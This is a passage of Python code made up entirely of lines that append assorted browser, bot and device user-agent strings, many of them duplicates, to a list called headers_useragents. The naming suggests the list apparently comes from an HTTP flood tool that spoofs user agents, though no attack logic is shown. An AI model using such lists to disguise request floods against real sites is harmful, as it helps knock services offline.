                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
                                    	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
                                    	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
                                    	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
                                    	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
                                    	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
